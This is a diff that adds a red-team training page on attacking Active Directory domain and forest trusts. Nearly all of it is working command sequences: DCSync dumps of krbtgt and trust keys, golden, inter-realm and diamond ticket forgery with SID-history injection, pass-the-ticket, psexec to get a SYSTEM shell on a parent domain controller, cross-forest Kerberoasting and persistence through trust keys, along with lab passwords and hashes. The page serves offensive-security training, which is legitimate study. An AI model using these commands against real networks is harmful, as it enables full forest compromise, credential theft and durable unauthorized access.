@@ -1,0 +1,366 @@
+---
+layout: training-page
+title: "Domain Trusts — Red Team Academy"
+module: "Active Directory"
+tags:
+  - domain-trusts
+  - forest-attacks
+  - child-to-parent
+  - sid-history
+page_key: "ad-domain-trusts"
+---
+<h1>Domain Trusts</h1>
+
+        <h2>Trust Types</h2>
+        <p>Domain trusts define authentication relationships between domains. Understanding trust direction and transitivity is essential for cross-domain/forest attack paths. A trust allows users in one domain to authenticate to resources in another.</p>
+
+        <div class="diagram-container">
+          <img src="/images/active-directory/domain-trusts-diagram.svg" alt="Domain trust diagram: parent-child bidirectional transitive trusts, one-way external forest trust">
+          <div class="diagram-label">// domain trust types — parent/child, cross-forest, and external trusts</div>
+        </div>
+
+        <pre><code>># Trust types and characteristics:
+
+# PARENT-CHILD (Intra-Forest)
+# - Automatically created when a child domain is added
+# - Bidirectional, transitive
+# - corp.local ↔ dev.corp.local
+# - Child DA can escalate to Parent Forest root
+
+# TREE-ROOT (Intra-Forest)
+# - Automatically created when a new domain tree joins a forest
+# - Bidirectional, transitive
+
+# SHORTCUT (Cross-Link)
+# - Manually created to improve authentication performance
+# - Can be one-way or two-way
+# - Used when users in separate trees frequently access each other's resources
+
+# EXTERNAL (Cross-Forest, Non-Transitive)
+# - Between domains in different forests
+# - One-way or two-way, NOT transitive
+# - Uses SID filtering by default (blocks SID history abuse)
+
+# FOREST (Cross-Forest, Transitive)
+# - Between forest root domains
+# - Allows all domains in both forests to trust each other
+# - Transitivity limited to the two forests
+# - SID filtering enabled by default
+
+# ESAE (Enhanced Security Admin Environment)
+# - Bastion forest trust — one-way only
+# - PAM (Privileged Access Management) scenarios</code></pre>
+
+        <h2>Enumerating Trusts</h2>
+        <p>Identify all domain trusts to map attack paths. BloodHound visualizes trust relationships; PowerShell and Impacket enumerate them from the command line.</p>
+        <pre><code>># PowerShell — enumerate trusts in current domain:
+Get-ADTrust -Filter *
+Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, ForestTransitive
+
+# Using .NET directly:
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
+# netdom (built-in on DCs and RSAT):
+netdom query trust
+
+# PowerView:
+Get-DomainTrust
+Get-DomainTrust -Domain corp.local
+
+# Map forest trusts:
+Get-ForestTrust
+Get-Forest | Select-Object -ExpandProperty Trusts
+
+# Enumerate users/groups from trusted domain:
+Get-DomainUser -Domain dev.corp.local
+Get-DomainGroup -Domain dev.corp.local
+
+# From Linux (Impacket):
+impacket-GetADUsers -all corp.local/Administrator:'Password123!' -dc-ip 172.16.5.5</code></pre>
+
+        <h2>Child-to-Parent Domain Escalation</h2>
+        <p>A Domain Admin in a child domain can escalate to Enterprise Admin in the forest root. The attack uses the inter-realm krbtgt key (shared between child and parent) to forge a ticket with the Enterprise Admin SID injected via SID history.</p>
+        <pre><code>># Prerequisites:
+# - DA privileges in child domain (dev.corp.local)
+# - Know the child domain's krbtgt NTLM hash
+# - Know the Enterprise Admins SID (forest root)
+
+# Step 1: Get child domain krbtgt hash (requires DA in child):
+# From child DC — dump krbtgt:
+mimikatz # lsadump::dcsync /domain:dev.corp.local /user:dev\krbtgt
+
+# Step 2: Get Enterprise Admins SID:
+Get-DomainSID -Domain corp.local
+# Enterprise Admins SID = ForestRootSID-519
+# Example: S-1-5-21-3842939050-3880317879-2865463114-519
+
+# Step 3: Get child domain SID:
+Get-DomainSID -Domain dev.corp.local
+
+# Step 4: Forge inter-realm Golden Ticket with ExtraIDs (SID history injection):
+mimikatz # kerberos::golden /user:Administrator /domain:dev.corp.local /sid:CHILD_DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:ENTERPRISE_ADMINS_SID /ticket:child_to_parent.kirbi
+# /sids: injects the Enterprise Admin SID into SID history
+# The inter-realm TGT will be accepted by the parent domain's KDC
+
+# Step 5: Use the forged ticket:
+mimikatz # kerberos::ptt child_to_parent.kirbi
+# Now access parent domain resources:
+dir \\corp-dc.corp.local\c$</code></pre>
+
+        <h2>Cross-Forest Trust Abuse</h2>
+        <p>Forest trusts with certain misconfigurations allow escalation across forest boundaries. The primary attack vector is abusing SID history if SID filtering is disabled, or exploiting foreign group memberships.</p>
+        <pre><code>># Check if SID filtering is disabled (dangerous misconfiguration):
+# From PowerShell:
+Get-ADTrust -Filter * | Select-Object Name, SIDFilteringQuarantined, SIDFilteringForestAware
+
+# If SIDFilteringForestAware = False → SID history injection works cross-forest
+
+# Enumerate foreign group members (users from Forest A in Forest B groups):
+Get-DomainForeignGroupMember -Domain partner.local
+Get-DomainForeignUser -Domain partner.local
+
+# If a user from your forest is in a privileged group in the partner forest:
+# Compromise that user → use their cross-forest trust ticket
+Get-ADGroupMember -Identity "Domain Admins" -Server partner.local
+
+# Cross-forest attack using trust ticket:
+# 1. Get trust key (inter-realm krbtgt) — requires DA in your forest
+impacket-secretsdump CORP/Administrator@172.16.5.5 -just-dc-user 'PARTNER$'
+# 'PARTNER$' is the trust account
+
+# 2. Forge cross-forest TGT with SID history (if SID filtering disabled):
+mimikatz # kerberos::golden /domain:corp.local /sid:CORP_SID /rc4:TRUST_KEY_HASH /user:Administrator /service:krbtgt /target:partner.local /sids:PARTNER_ENTERPRISE_ADMINS_SID /ticket:cross_forest.kirbi
+
+# 3. Use ticket:
+rubeus.exe ptt /ticket:cross_forest.kirbi
+dir \\partner-dc.partner.local\c$</code></pre>
+
+        <h2>Enumerating Trust Attack Paths with BloodHound</h2>
+        <p>BloodHound can graph trust relationships and identify cross-domain escalation paths automatically.</p>
+        <pre><code>># Collect data from all trusted domains:
+# Run SharpHound with -d flag for each domain:
+SharpHound.exe -c All -d corp.local
+SharpHound.exe -c All -d dev.corp.local
+
+# In BloodHound — pre-built queries for trusts:
+# "Shortest Paths to Domain Trusts"
+# "Find Paths to Foreign Domain"
+# "Foreign Admins" (users from domain A in domain B admin groups)
+
+# Custom Cypher query — find cross-domain admin paths:
+MATCH p=(n:User)-[:MemberOf*1..]->(m:Group &#123;name:"DOMAIN ADMINS@DEV.CORP.LOCAL"&#125;)
+WHERE n.domain = "CORP.LOCAL"
+RETURN p
+
+# List all trust relationships in BloodHound:
+MATCH (n:Domain)-[r:TrustedBy]->(m:Domain) RETURN n.name, r.transitive, m.name</code></pre>
+
+        <h2>Trust Ticket via Impacket (Linux)</h2>
+        <p>Conduct cross-domain attacks from Linux using Impacket's ticketer for ticket forgery and lookupsid/GetUserSPNs with the <code>-target-domain</code> flag.</p>
+        <pre><code>># Get SIDs from both domains:
+impacket-lookupsid corp.local/Administrator:'Password123!'@172.16.5.5 | grep -i "domain sid"
+impacket-lookupsid corp.local/Administrator:'Password123!'@172.16.5.5 | grep -i "enterprise"
+
+# Kerberoast across trust (if cross-forest trust allows it):
+impacket-GetUserSPNs -target-domain partner.local corp.local/Administrator:'Password123!' -dc-ip 172.16.5.5
+
+# Forge Golden Ticket with SID injection via impacket-ticketer:
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid CHILD_SID -domain dev.corp.local -extra-sid ENTERPRISE_ADMINS_SID Administrator
+# Outputs Administrator.ccache
+
+# Use the ticket:
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp-dc.corp.local</code></pre>
+
+        <h2>ExtraSids Attack — Rubeus (Windows)</h2>
+        <p>Rubeus can forge the inter-realm Golden Ticket directly from Windows without Mimikatz. Requires the child domain's krbtgt NTLM hash, child domain SID, and the Enterprise Admins SID.</p>
+        <pre><code># Forge Golden Ticket with Rubeus (child → parent):
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+# Verify ticket loaded:
+klist
+
+# DCSync parent domain user with the loaded ticket:
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL</code></pre>
+
+        <h2>Child-to-Parent Escalation — Full Linux Workflow</h2>
+        <p>Perform the entire ExtraSids attack from a Linux host using Impacket tools. Each step is a discrete command that can be run individually.</p>
+        <pre><code># Step 1: DCSync child domain krbtgt hash:
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+# Note the NTLM hash: 9d765b482771505cbe97411065964d5f
+
+# Step 2: Get child domain SID:
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+# S-1-5-21-2806153819-209893948-922872689
+
+# Step 3: Get Enterprise Admins SID from parent domain DC:
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+# S-1-5-21-3842939050-3880317879-2865463114-519
+
+# Step 4: Forge Golden Ticket with SID injection:
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
+  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
+  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
+  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
+  hacker
+# Outputs: hacker.ccache
+
+# Step 5: Use ticket for SYSTEM shell on parent DC:
+export KRB5CCNAME=hacker.ccache
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local \
+  -k -no-pass -target-ip 172.16.5.5
+
+# Alternative — automated one-shot with raiseChild.py:
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></pre>
+
+        <h2>Cross-Forest Kerberoasting — Rubeus</h2>
+        <p>Kerberoast across a forest trust from Windows using the <code>/domain</code> flag. Targets accounts with SPNs in the partner forest that may be DA in that domain.</p>
+        <pre><code># Enumerate SPNs in target forest:
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+# Check if the SPN account is in DA:
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
+
+# Kerberoast cross-forest with Rubeus:
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+# Crack the TGS offline: hashcat -m 13100
+
+# From Linux (Impacket):
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile cross_forest_tgs.txt</code></pre>
+
+        <h2>Admin Password Re-Use &amp; Foreign Group Membership</h2>
+        <p>Bidirectional forest trusts often have cross-forest admin group members. Enumerate with PowerView's <code>Get-DomainForeignGroupMember</code> and check for password re-use across similarly-named admin accounts.</p>
+        <pre><code># Find users from other forests in local groups:
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+# Resolve the SID to a name:
+Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+# → INLANEFREIGHT\administrator
+
+# If INLANEFREIGHT\administrator is in Administrators@FREIGHTLOGISTICS.LOCAL:
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+# Full admin access to partner domain DC
+
+# Check password re-use: if adm_bob.smith exists in Domain A,
+# try same password for bsmith_admin in Domain B</code></pre>
+
+        <h2>Multi-Domain BloodHound Collection</h2>
+        <p>Collect BloodHound data from multiple domains/forests by running bloodhound-python against each. Update /etc/resolv.conf between runs to point at the correct DC.</p>
+        <pre><code># Configure DNS for first domain:
+# /etc/resolv.conf: domain INLANEFREIGHT.LOCAL + nameserver 172.16.5.5
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+zip -r ilfreight_bh.zip *.json
+
+# Configure DNS for partner domain:
+# /etc/resolv.conf: domain FREIGHTLOGISTICS.LOCAL + nameserver 172.16.5.238
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
+  -c All -u forend@inlanefreight.local -p Klmcargo2
+zip -r freightlogistics_bh.zip *.json
+
+# In BloodHound GUI:
+# Analysis → "Users with Foreign Domain Group Membership"
+# Select source domain: INLANEFREIGHT.LOCAL to see cross-forest admin memberships</code></pre>
+
+        <h2>Trust Key Extraction and Inter-Realm TGT Forgery</h2>
+        <p>An alternative to the krbtgt golden ticket approach — extract the trust key shared between child and parent domains and forge an inter-realm TGT directly. The trust key is stored in the Trusted Domain Object (TDO) and is rarely rotated, making it a durable persistence mechanism.</p>
+        <pre><code># Step 1: Extract trust key from child domain (requires DA in child)
+# Method A: lsadump::trust
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+
+# Method B: DCSync the trust account (named after parent domain NetBIOS$)
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:dollarcorp.moneycorp.local /user:mcorp$"'
+# Note the RC4 (NTLM) or AES256 key from output
+
+# Step 2: Gather required SIDs
+# Child domain SID:
+Get-DomainSID
+# Parent domain SID:
+Get-DomainSID -Domain moneycorp.local
+# Enterprise Admins SID = ParentDomainSID-519
+
+# Step 3: Forge inter-realm TGT using the trust key
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:TRUSTKEY_HASH /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:trust_tkt.kirbi"'
+# /service:krbtgt and /target: parent domain — these flags make it an inter-realm TGT
+# /rc4 = trust key hash (not krbtgt hash)
+
+# Rubeus equivalent:
+Rubeus.exe golden /rc4:TRUSTKEY_HASH /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /nowrap /target:moneycorp.local
+
+# Step 4: Request TGS from parent domain using the forged inter-realm TGT
+Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:CIFS/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+
+# Step 5: Access parent domain
+dir \\mcorp-dc.moneycorp.local\c$
+Invoke-Command -ComputerName mcorp-dc.moneycorp.local -ScriptBlock &#123;hostname&#125;
+
+# Trust key persistence note:
+# Trust keys are extremely stable — rarely rotated in production
+# Compromise persists even if child domain is fully remediated
+# Only broken when the trust relationship is recreated</code></pre>
+
+        <h2>Child-to-Parent Escalation — Diamond Ticket via Rubeus</h2>
+        <p>The Diamond Ticket is a stealthier alternative to the classic golden ticket for cross-domain escalation. It starts with a legitimate TGT delegation request (no forged ticket from scratch), then modifies the PAC in-place using the krbtgt AES key. All timestamps are genuine, making it harder to detect than a forged golden ticket with /sids injection.</p>
+        <pre><code># Prerequisites (same as golden ticket SID history attack):
+# - DA in child domain
+# - child domain krbtgt AES256 key
+# - Enterprise Admins SID of the forest root
+
+# Get child domain krbtgt AES256 key (DCSync):
+mimikatz # lsadump::dcsync /user:CHILD\krbtgt
+# Note: aes256_hmac key from "Primary:Kerberos-Newer-Keys" section
+
+# Get forest root Enterprise Admins SID:
+# Using SharpView from C2:
+sharpview -- Get-DomainSid -Domain htb.local
+# → S-1-5-21-264881711-3359223723-3458204895
+# Enterprise Admins = that SID + -519
+
+# Forge Diamond Ticket via Rubeus (requires /tgtdeleg for delegation trick):
+.\Rubeus.exe diamond \
+  /tgtdeleg \
+  /ticketuser:administrator \
+  /ticketuserid:500 \
+  /groups:519 \
+  /sids:S-1-5-21-264881711-3359223723-3458204895-519 \
+  /krbkey:f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 \
+  /nowrap
+# /tgtdeleg   — uses AP-REQ delegation for legitimate ticket acquisition
+# /groups:519 — injects Enterprise Admins RID (519) into PAC
+# /sids       — adds parent domain Enterprise Admins SID via SID history
+# /krbkey     — child domain krbtgt AES256 key (or use /krbenctype:rc4 with /krbkey:NTLM)
+
+# The result is a base64-encoded ticket — pass it to Rubeus ptt:
+.\Rubeus.exe ptt /ticket:BASE64_TICKET_FROM_ABOVE
+
+# Verify access to parent domain DC:
+ls \\dc02.htb.local\c$
+
+# Diamond Ticket advantages over classic Golden Ticket:
+# - Real KDC-issued TGT (timestamps match DC clock)
+# - PAC modification is in-memory, not crafted from scratch
+# - Harder to detect with ticket lifetime / clock skew anomaly detection
+# - Still requires krbtgt key — same initial access requirement</code></pre>
+
+        <h2>External Trust SID Filtering and Bypass</h2>
+        <p>External trusts between different forests have SID filtering enabled by default, which strips injected SID history. Check the quarantine status to determine if SID injection is possible. When SID filtering is disabled on an external trust, attack it the same way as a parent-child trust.</p>
+        <pre><code># Check SID filtering status on external trust (via netdom):
+netdom trust domainA /domain:domainB /quarantine
+# If output shows "quarantine: No" → SID filtering DISABLED → inject SIDs
+
+# Enumerate what cross-trust access already exists:
+Get-DomainForeignGroupMember -Domain external.local
+Get-DomainForeignUser -Domain external.local
+
+# Identify Domain A users with high privileges in Domain B:
+# Look for Domain A principals in Domain B admin groups (foreign security principals)
+
+# If SID filtering is disabled — inject SIDs across external trust:
+Invoke-Mimikatz -Command '"kerberos::golden /domain:domainA.local /sid:S-1-5-21-xxx /sids:S-1-5-21-yyy-512 /rc4:TRUSTKEY /user:Administrator /service:krbtgt /target:domainB.local /ticket:ticket.kirbi"'
+# /sids: S-1-5-21-yyy-512 = Domain Admins of Domain B (RID 512)
+
+# If SID filtering is enabled — forge ticket only for legitimately privileged users:
+Invoke-Mimikatz -Command '"kerberos::golden /domain:domainA.local /sid:S-1-5-21-xxx /rc4:TRUSTKEY /user:PrivilegedUser /service:krbtgt /target:domainB.local /ticket:ext_tkt.kirbi"'
+Rubeus.exe asktgs /ticket:ext_tkt.kirbi /service:CIFS/server.domainB.local /dc:dc.domainB.local /ptt
+
+# Groups to inject via /sids (RIDs):
+# 519 = Enterprise Admins (forest root only)
+# 512 = Domain Admins
+# 518 = Schema Admins</code></pre>
